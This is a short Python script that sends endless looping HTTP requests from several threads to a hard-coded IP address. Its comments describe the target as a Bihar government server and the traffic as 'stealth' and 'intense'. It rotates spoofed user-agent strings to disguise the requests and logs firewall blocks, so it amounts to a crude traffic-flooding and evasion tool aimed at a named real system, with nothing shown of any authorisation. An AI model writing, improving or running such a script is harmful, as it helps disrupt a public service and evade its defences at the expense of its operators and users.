import requests
import threading
import random
import time

# Settings
TARGET_URL = "http://103.194.24.157"
THREADS = 5

# Packet Sender jaisa stealth traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/605.1",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"
]

def send_packet(id):
    while True:
        try:
            header = {'User-Agent': random.choice(USER_AGENTS)}
            # Bihar Govt server testing
            r = requests.get(TARGET_URL, headers=header, timeout=10)
            print(f"[Thread {id}] Success! Status: {r.status_code}")
        except Exception as e:
            print(f"[Thread {id}] Firewall Block: {e}")
        time.sleep(3)

if __name__ == "__main__":
    print("--- Bihar VLTS Dashboard: Intense Traffic Mode ---")
    for i in range(THREADS):
        t = threading.Thread(target=send_packet, args=(i,), daemon=True)
        t.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping Dashboard...")
